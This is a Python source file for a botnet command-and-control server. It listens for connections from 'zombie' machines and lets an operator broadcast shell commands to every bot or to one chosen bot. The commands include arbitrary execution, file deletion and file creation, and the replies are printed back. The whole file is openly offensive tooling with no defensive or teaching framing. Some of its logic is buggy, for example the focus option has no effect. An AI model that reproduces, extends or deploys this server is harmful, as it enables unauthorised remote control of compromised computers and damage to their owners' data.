import sys
import os
import socket
import threading
import queue
import time

q = queue.Queue()
Socketthread = [] # Array to store all the child threads that will be spawned by the main process
botList = {}

class bot_Commander(threading.Thread):
    def __init__(self, qv2):
        threading.Thread.__init__(self)
        self.q = qv2
        self.focused_bot = None
    
    def run(self):
        while True:
            command = str(input(">>"))
            if command == "":
                pass
            elif command == "exit":
                for i in range(len(Socketthread)):
                    time.sleep(0.2)
                    self.q.put("exit")
                    time.sleep(2)
                    os._exit(0)
            elif command == "help":
                print("[+] Available commands:")
                print("whoami - Print current user name")
                print("hostname - Print name of current host")
                print("ls - List files and directories in the current directory")
                print("pwd - Print current working directory")
                print("exit - Exit the program")
                print("rm <file> - Remove a file")
                print("cd <directory> - Change current directory")
                print("exec <command> - Execute a system command")
                print("nano <file> <content> - Create a file with content")
                print("focus <bot number> - Focus on a bot to send commands only to that bot")
                print("unfocus - Stop focusing on a bot and send commands to all bots")
                print("botlist - List connected bots")  # Added botlist command
            elif command.startswith("focus"):
                if len(command.split()) != 2:
                    print("Invalid usage. Correct usage: focus <bot number>")
                else:
                    bot_num = int(command.split()[1])-1
                    if bot_num >= len(Socketthread) or bot_num < 0:
                        print(f"{bot_num} is an invalid bot number")
                    else:
                        self.focused_bot = bot_num
                        print(f"[+] Focusing on bot {bot_num+1}")
            elif command == "unfocus":
                self.focused_bot = None
                print("[+] Unfocusing on bot")
            elif command == "botlist":  # Added botlist command
                print("[+] Connected Bots:")
                for bot_num, bot_addr in botList.items():
                    print(f"Bot {int(bot_num)-1}: {bot_addr[0]}:{bot_addr[1]}")
            else:
                if self.focused_bot is None:
                    print("[+] Sending Command: " + command + " to " + str(len(Socketthread)) + " bots")
                    for i in range(len(Socketthread)):
                        time.sleep(0.1)
                        self.q.put(command)
                else:
                    print("[+] Sending Command: " + command + " to bot " + str(self.focused_bot))
                    time.sleep(0.1)
                    self.q.put(command)

class bot(threading.Thread):
    def __init__(self, client, clientAddr, qv):
        threading.Thread.__init__(self)
        self.client = client
        self.clientAddr = clientAddr
        self.ip = clientAddr[0]
        self.port = clientAddr[1]
        self.qv = qv
    
    def run(self):
        name = threading.current_thread().getName().split("-")[1]
        print("[*] Zombie Process " + self.ip + ":" + str(self.port) + " connected with Thread-ID: ", int(name)-1)
        botList[name] = self.clientAddr
        while True:
            cmd = self.qv.get()
            if isinstance(cmd, tuple):
                thread_name, command = cmd
                if thread_name != name:
                    continue
            else:
                command = cmd
            try:
                command += "\n"
                self.client.send(command.encode('utf-8'))
                rec = self.client.recv(1024).decode('utf-8')
                print(rec)
            except Exception as ex:
                print(ex)
                break



                    
def server(host, port, q):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Initializing socket for IPV4 SCHEMA and TCP stream
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Setting socket options (SOL_SOCKET) to be REUSABLE (REUSEADDR 1)
    serverAddress= (host, port)
    server.bind(serverAddress)
    server.listen(100)
    print ("[+] Starting Botnet listener on tcp://" + host + ":" + str(port) + "\n")
    print("Use command 'help' to view available commands...\n")
    BotCmdThread = bot_Commander(q)
    BotCmdThread.start()
    try:
        while True:
            (client, client_address) = server.accept()
            newthread = bot(client, client_address, q)
            Socketthread.append(newthread)
            newthread.start()
    except KeyboardInterrupt:
        print("\n[+] Exiting...\n")
        for i in range(len(Socketthread)):
            time.sleep(0.2)
            q.put("exit")
            time.sleep(2)
            os._exit(0)

def main():
    if(len(sys.argv)<3):
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            server(local_ip, 8080, q)
            
            # Print the available commands when the server starts
            print("[*] Available commands: whoami, hostname, ls, pwd, exit, rm, cd, exec, nano, help")
            
        except Exception as ex:
            print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")
    else:
        try:
            servhost = sys.argv[1]
            servport = int(sys.argv[2])
            server(servhost, servport, q)
            
            # Print the available commands when the server starts
            print("[*] Available commands: whoami, hostname, ls, pwd, exit, rm, cd, exec, nano, help")
            
        except Exception as ex:
            print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")

if __name__ == '__main__':
    main()
